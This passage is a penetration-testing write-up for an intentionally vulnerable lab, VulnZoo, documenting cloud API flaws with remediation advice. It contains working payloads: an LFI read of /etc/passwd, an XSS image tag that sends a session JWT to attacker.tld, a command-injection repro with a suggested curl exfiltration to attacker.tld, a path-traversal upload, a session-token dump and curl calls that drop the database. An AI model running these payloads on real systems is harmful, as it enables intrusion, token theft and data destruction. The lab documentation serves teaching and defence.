maxgarci@maxgarci-Ubuntu:~/Desktop/VulnZoo/cloud_api$ wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -d '{"username":"FUZZ"}' -H "Content-Type: application/json" --sc 409 http://192.168.2.101:5000/register
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.2.101:5000/register
Total requests: 151265

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                           
=====================================================================

000001813:   409        3 L      6 W        38 Ch       "admin"                                           
000069397:   409        3 L      6 W        38 Ch       "john"                                            
000102090:   409        3 L      6 W        38 Ch       "peter"
```

## Attack Vector #1: Cross-Site Request Forgery

### Vulnerability Description

> **CSRF is not included in the OWASP API Top 10, but it can be considered part of poor API security configuration.**

The form found in the `admin.html` template can be exploited by CSRF attacks if the admin user visits a malicious page because it does not include any CSRF token or additional validation.
```html
<form method="POST" action="/admin/roles">
    <!-- ... -->
</form>
```

The endpoint `/admin/roles` accepts any POST request if the user has a valid session. An attacker can create a malicious page with a hidden form that sends a POST request to `/admin/roles`, and if the administrator is authenticated and visits this page, the browser will automatically send the session cookies, the backend will receive the request, and since it enforces only a weak `Referer` substring check (it just looks for `/admin` anywhere in the header) with no CSRF token, a POST from an attacker page whose own URL path contains `/admin` is processed as a legitimate role change by the admin.

The attacker can take advantage of the `/support` endpoint that links to a resource that allows them to contact the administrator. This endpoint is used for new users to request access to the cameras from the administrator, granting them the role of `viewer`.

In the request submission form that the system administrator will later see, files such as images can be included to report errors and questions. These images can be attack vectors where the attacker includes HTML code that sends POST requests to the `/admin/roles` endpoint.

##  Attack Vector #2: Information Disclosure via System Logs

### Vulnerability Description

> **IN PROGRESS**

The endpoint `/api/system/logs` is designed as a system monitoring feature, but it lacks authentication and exposes sensitive information about administrator activities, including their internal ID in multiple log entries.

### Vulnerable Endpoint

- **URL:** `GET /api/system/logs`
- **Method:** HTTP GET
- **Authentication:** Not required
- **Optional Parameters:**
- `type`: Filter by log level (info, debug, warn, error)
    - `limit`: Maximum number of logs to return

# API9:2023 - Improper Inventory Management

## Attack Vector #3: Information Disclosure via API Status

###  Description

> **DONE**

The `/api/status` endpoint is intended to provide information about the system's health. This endpoint is accessible without any form of authentication or validation. Additionally, it exposes extensive details regarding the system's capabilities.

The mechanism for validating the information available to the user performs insufficient sanitization of input parameters, which allows for the execution of a _Local File Inclusion (LFI)_ attack.

Furthermore, this endpoint allows file uploads using the PUT method, creating an additional attack surface that can be exploited to compromise the associated IoT device. This is similar to the [[IoT (Camera)/Vulnerabilities#IoT4:2018 - Lack of Secure Update Mechanism| lack of security in the update mechanism]] vulnerability.

### Vulnerable Endpoint

- **URL:** `GET /api/status`
- **Method:** HTTP GET PUT OPTIONS
- **Authentication:** Not required
## Demonstration

```bash
maxgarci@maxgarci-Ubuntu:~/Desktop/VulnZoo/cloud_api$ curl http://192.168.2.101:5000/api/status
{
  "available_features": [
    "cpu_info",
    "mem_info",
    "disk_info",
    "uptime",
    "loadavg",
    "mounts",
    "net_info",
    "os_release",
    "hostname",
    "users",
    "processes"
  ],
  "usage": "/api/status?feature=<feature_name>"
}
maxgarci@maxgarci-Ubuntu:~/Desktop/VulnZoo/cloud_api$ curl http://192.168.2.101:5000/api/status?feature=....//....//....//....//etc/passwd
{````plain
  "content": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin\nsystemd-timesync:x:996:996:systemd Time Synchronization:/:/usr/sbin/nologin\nDebian-exim:x:100:101::/var/spool/exim4:/usr/sbin/nologin\nmessagebus:x:995:995:System Message Bus:/nonexistent:/usr/sbin/nologin\navahi:x:101:102:Avahi mDNS daemon:/run/avahi-daemon:/usr/sbin/nologin\nusbmux:x:102:46:usbmux daemon:/var/lib/usbmux:/usr/sbin/nologin\ncups-pk-helper:x:103:104:user for cups-pk-helper service:/nonexistent:/usr/sbin/nologin\npolkitd:x:989:989:User for polkitd:/:/usr/sbin/nologin\n",
  "feature": "....//....//....//....//etc/passwd"
}
```

## Attack Chain with Mobile Devices

Read about the mobile vulnerability [[Mobile/Vulnerabilities|Mobile vulnerabilities]] in this section.

As demonstrated, an attacker can leverage a **Local File Inclusion (LFI)** vulnerability in the `/api/status` endpoint to achieve arbitrary file reading on the API server. This provides access to sensitive information that may lead to:

- Remote command execution (via LFI→RFI or Log Poisoning techniques)
- Privilege escalation on the underlying container or host
- Internal architecture mapping of the system

The attacker may have previously discovered critical paths through web fuzzing techniques.

![[api9_c2_panel_exposure_lfi.png]]

A **Security Misconfiguration** in the Cloud API is the exposure of files with predictable names located in standard paths. This facilitates the enumeration of configuration files.

```zsh
$ ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common-api-endpoints.txt \
    -u http://target/FUZZ -e .py, .conf, .yaml
```

**Hardcoded data** of special relevance may be found, which is used for the alleged "diagnostic service" —which turns out to be, broadly speaking, a **backdoor** on mobile devices (laboratory scenario simulating an _insider threat_ or malicious implantation).

![[C2_credentials.png]]

With these credentials, the attacker gains access to the administration panel of backdoors registered in mobile applications.

![[api9_c2_panel_backdoor.png]]

The attacker can **chain** these capabilities with mobile device vulnerabilities analyzed in section **M9 - Insecure Data Storage**. For example, the backdoor can exfiltrate a user's session JWT token, which is stored in the device's `SharedPreferences` **without encryption or access control mechanisms**, allowing its reading and malicious use by applications with root permissions or through the C2 backdoor itself.
# API10:2023 - Unsafe Consumption of API

> **DONE**

In the system's messaging functionality, the frontend allows users to specify the recipient, subject, and message body. However, **the backend relies on client-supplied data without validating the sender's identity**. As a result, an attacker can manipulate the `sender` field—by modifying local storage or intercepting the request—and impersonate any user, including an administrator or another client.

This vulnerability enables **internal phishing attacks**, allowing malicious actors to deceive other users into believing that messages originate from legitimate sources. The system does not verify that the sender of the message matches the user authenticated via JWT, thereby facilitating identity spoofing.

This issue is primarily classified as **API10:2023 – Unsafe Consumption of API**, as the backend consumes and trusts client-provided data without validation or integrity checks.

**Impact:**

- Internal identity spoofing.
- Phishing and user manipulation.
- Loss of trust in the messaging system.

**Recommendation:**  
The backend should associate the message sender with the user authenticated by the JWT and must not allow the client to arbitrarily define the `sender` field.

## Demonstration

The attacker can analyze the JavaScript code of the */messages* endpoint and find out that there is no validation of who sends the message since, instead of sending the JWT, what is sent is the username extracted directly from the browser's localStorage.

![[api10_sent_message_uses_localStorage_username.png]]

This allows the user data of the person “sending the message” to be changed, with the system verifying that it was sent by another user. This vulnerability allows a phishing attack to be carried out on the internal messaging service.

![[api10_message_sent2user.png]]

The attacker has placed a ‘1’ instead of an ‘l’ to try to confuse the user and make them think it is a legitimate link. The social engineering attack falls slightly outside the scope of this project. However, by taking advantage of the attacker's access as a client to the application's frontend files, they can replicate an identical appearance so that when the victim accesses the site, they do not suspect that their personal data is being processed on a site other than the company's server. This can be used to replicate application functionalities and extract personal information from the user, request that they re-enter their password or change it, intercept their JWT, etc.

The first way to carry out this identity theft would be to change the user's name in the browser's local storage.

![[api10_username_changed.png]]

The second way is to intercept with an interception proxy to modify the sending packet, such as BurpSuite or OWASP ZAP.

![[api10_message_sent.png]]

As you can see, the message has been recorded along with the other messages addressed to the user *peter* as coming from *admin*.

![[api10_message_received.png]]

![[api10_user_peter_received_message_CSRF.png]]

## Stored XSS in the message reader (chained with API10)

> **DONE**

The same trust boundary abused above turns into a Stored Cross-Site Scripting sink. `POST /api/messages` stores the client-supplied `message` body verbatim, with no sanitization, and the inbox reader renders that body as HTML instead of text. The system messages (welcome and support auto-replies) are authored as HTML, which is why the reader renders markup rather than escaping it:

```js
// static/js/messages.js
document.getElementById('readerBody').innerHTML = m.body || '';
```

Because the opened message is injected with `innerHTML`, any markup in the body is rendered inside the recipient's authenticated session. The inbox list still uses `escapeHtml()`, so only opening the message triggers the payload.

Chained with the API10 sender spoofing, the attacker sends a message that appears to come from `admin` and carries an HTML payload. A `<script>` element inserted through `innerHTML` does not execute, so the working vector is an event handler or an inline form:

```html
<img src=x onerror="fetch('https://attacker.tld/x?j='+localStorage.getItem('auth'))">
```

When the victim opens the message the handler fires and exfiltrates the victim's JWT, which is also stored in plaintext by the mobile app (see [[Mobile/Vulnerabilities#M9: Insecure Data Storage|M9 - Insecure Data Storage]]). An inline fake login form is an equally effective phishing variant, reinforcing the spoofing scenario documented above.

**Impact:**
- Theft of the victim's session JWT in their browser context.
- High-fidelity internal phishing (spoofed admin sender plus rendered HTML).
- Account takeover when the stolen token belongs to a privileged user.

**OWASP mapping.** Stored XSS (CWE-79) is not a standalone category in the OWASP API Security Top 10 2023. Here it is the output-side consequence of API10:2023, the frontend consuming and rendering client-supplied data with no output encoding. Root cause: unsanitized storage in `POST /api/messages` plus `innerHTML` rendering in the reader.

**Recommendation.** Bind the message sender to the authenticated JWT (the API10 fix) and, when rendering, either use `textContent` or sanitize the body against an allowlist of formatting tags, stripping event handlers and scriptable elements.

> **INTRODUCE EXAMPLE WITH PASSWORD CHANGE CSRF**

---

# Exposed Debug and Administrative Endpoints (additional findings)

Beyond the OWASP-category findings above, the API exposes several debug and administrative endpoints with no authentication or with a trivially weak check. They were undocumented but are among the highest-impact issues in the lab, including an unauthenticated remote code execution on the API host. Each finding below is tagged with its OWASP API 2023 category and CWE. They are documented from source review and the badges are `IN PROGRESS`, they have not been reproduced against the live lab because the destructive and RCE findings must not be run against a working deployment.

## Unauthenticated OS command injection in /firmware/trigger_update (API8:2023, CWE-78)

> **IN PROGRESS**

`POST /firmware/trigger_update` takes `device_ip` and `firmware_url` from the request and builds a shell command that it runs with `shell=True`, with no authentication and no input sanitization:

```python
# app.py
cmd = f"ssh root@{device_ip} '/etc/init.d/update-firmware {firmware_url}'"
subprocess.Popen(cmd, shell=True)
```

Both parameters are attacker-controlled and are interpolated straight into the shell string, so either one injects arbitrary commands that run on the API host as the API process user. The SSH call does not even need to succeed, the injected command runs while the shell parses the line.

Repro (runs a harmless probe on the API host):

```bash
curl -X POST http://localhost:5000/firmware/trigger_update \
  --data-urlencode 'device_ip=127.0.0.1; touch /tmp/pwned ;#' \
  --data-urlencode 'firmware_url=x'
```

Expected result: HTTP 200 `{"status": "update triggered", ...}` returns immediately because `Popen` does not wait, and `/tmp/pwned` then exists inside the API container. Swap the payload for a reverse shell or `id | curl -T - http://attacker.tld/` to prove full command execution and exfiltration.

Impact: unauthenticated remote code execution on the API server. Even without injection, the endpoint lets an attacker point any `device_ip` at any `firmware_url`, which is the network half of the firmware-poisoning chain against the camera (see IoT4).

Recommendation: authenticate and authorize the endpoint, drop `shell=True`, pass arguments as a list, and validate `device_ip` against an allowlist and `firmware_url` against an expected origin.

## Unauthenticated firmware upload with path traversal in /firmware/upload (API8:2023, CWE-434, CWE-22)

> **IN PROGRESS**

`POST /firmware/upload` accepts any multipart file with no authentication and writes it under the client-supplied filename, unsanitized:

```python
# app.py, UPLOAD_FOLDER = '/vulnzoo/firmware'
filepath = os.path.join(UPLOAD_FOLDER, file.filename)
file.save(filepath)
```

Because `file.filename` is never sanitized, a filename such as `../../etc/cron.d/x` traverses out of the upload folder, so this is arbitrary file write and not only arbitrary upload. The uploaded blob is also served as the newest firmware by `GET /firmware/latest`, so an attacker can stage a malicious firmware that the device later fetches and runs, chained with the device `update-firmware` and with `trigger_update` above. See IoT4 for the device-side execution.

Repro:

```bash
# arbitrary upload, becomes /firmware/latest
curl -X POST http://localhost:5000/firmware/upload -F 'file=@evil.bin'
curl http://localhost:5000/firmware/latest -o pulled.bin   # same bytes back

# path traversal write outside the upload folder
curl -X POST http://localhost:5000/firmware/upload \
  -F 'file=@evil.bin;filename=../../tmp/escaped.bin'
```

Expected result: HTTP 200 `{"status": "uploaded", "filename": ...}`, the file present in `/vulnzoo/firmware` (or at the traversed path), and `GET /firmware/latest` returning the attacker's bytes.

Impact: arbitrary file write on the API host and poisoning of the firmware update channel.

Recommendation: authenticate the endpoint, sanitize the name with `secure_filename`, pin the destination directory, and verify a real firmware signature.

## Session-token disclosure via /api/v1/debug/sessions (API9:2023, API2:2023, CWE-639, CWE-284)

> **IN PROGRESS**

`GET /api/v1/debug/sessions` requires an `admin_id` parameter and checks only that it belongs to an existing admin user, never that the caller is that admin. It then returns every session document including its `_id`, which is the session token used by the session-accepting paths:

```python
# app.py
admin_user = mongo_client.vulnzoo_vuln.users.find_one({'_id': ObjectId(admin_id)})
if not admin_user or admin_user.get('role') != 'admin': ...  # existence check only
sessions = list(mongo_client.vulnzoo_vuln.sessions.find({}))
for session in sessions:
    session['_id'] = str(session['_id'])   # token exposed
```

The required `admin_id` is not secret, it leaks from the documented `GET /api/system/logs` (API8 Attack Vector #2), from `GET /api/messages` (the sender_id), and from `GET /api/v1/userinfo`.

Repro:

```bash
# 1. obtain the admin id (for example from the logs endpoint)
curl 'http://localhost:5000/api/system/logs' | grep -oE 'user_id=[a-f0-9]+'
# 2. dump every session including the _id token
curl 'http://localhost:5000/api/v1/debug/sessions?admin_id=<ADMIN_ID>'
```

Expected result: HTTP 200 with a `sessions[]` array where each entry carries `_id` (the session token) plus user_id, role, ip and user_agent. The admin session `_id` can then be replayed on the session-accepting paths.

Impact: session hijacking, including the administrator's session, from an unauthenticated position given a public admin id.

Recommendation: remove the debug endpoint from production, or bind it to a verified admin session and never return session identifiers.

## Unauthenticated session enumeration via /sessions (API9:2023, API8:2023, CWE-200)

> **IN PROGRESS**

`GET /sessions` returns every session document with no authentication. It projects out `_id`, so it does not leak the session token, but it does expose the metadata of every active session:

```python
# app.py
sessions = list(mongo_client.vulnzoo_vuln.sessions.find({}, {"_id": 0}))
return jsonify({"sessions": sessions})
```

Repro:

```bash
curl http://localhost:5000/sessions
```

Expected result: HTTP 200 with a `sessions[]` array where each entry has `user_id`, `username`, `role`, `ip`, `user_agent` and `timestamp`. This maps users to roles and source IPs and confirms which accounts, including admins, are currently logged in, which is useful reconnaissance for the higher-severity findings.

Impact: unauthenticated disclosure of who is logged in, their roles and their IPs. Unlike `/api/v1/debug/sessions`, it does not expose the token itself.

Recommendation: authenticate the endpoint and scope it to the caller's own session.

## Unauthenticated database destruction via /camerasdb/delete and /camerasdb/restart (API8:2023, API5:2023, CWE-306, CWE-352)

> **IN PROGRESS**

`GET /camerasdb/delete` drops the whole application database with no authentication, and `GET /camerasdb/restart` wipes and reinitializes it:

```python
# app.py
@app.route('/camerasdb/delete', methods=['GET'])
def delete_cameras_db():
    mongo_client.drop_database('vulnzoo_vuln')
```

Because these are state-changing actions exposed over GET with no auth and no CSRF token, they can be triggered by a simple visit, an image tag, or a link prefetch.

Repro (destructive, do not run against a working lab):

```bash
curl http://localhost:5000/camerasdb/delete     # drops users, cameras, sessions
curl http://localhost:5000/camerasdb/restart    # wipe and reseed
```

Expected result: HTTP 200 `{"message": "... deleted successfully"}` and the database emptied, all users, cameras and sessions gone until `GET /camerasdb/init` runs again.

Impact: full data destruction and denial of service from an unauthenticated position, and a CSRF sink because it is a GET.

Recommendation: require an authenticated admin, use POST with a CSRF token, and gate destructive maintenance behind a non-public interface.

## JWT decode without signature verification via /api/debug/decode_token (API9:2023, CWE-489, CWE-200)

> **IN PROGRESS**

`POST /api/debug/decode_token` decodes any supplied JWT with the signature check disabled and returns the payload, unauthenticated:

```python
# app.py -> JWTService.decode_without_verification(token)
payload = jwt.decode(token, options={'verify_signature': False})
```

Repro:

```bash
curl -X POST http://localhost:5000/api/debug/decode_token \
  -H 'X-Auth-Token: <ANY_JWT>'
```

Expected result: HTTP 200 `{"decoded": true, "payload": {...}, "note": "Token decoded without signature verification (debug mode)"}`.

Impact: a debug oracle that reveals the internal structure and claims of any captured token, for example the `user_id` an attacker then forges with the weak secret (see API2). Low direct impact, but it is production debug surface that should not exist.

Recommendation: remove the debug endpoint from production builds.
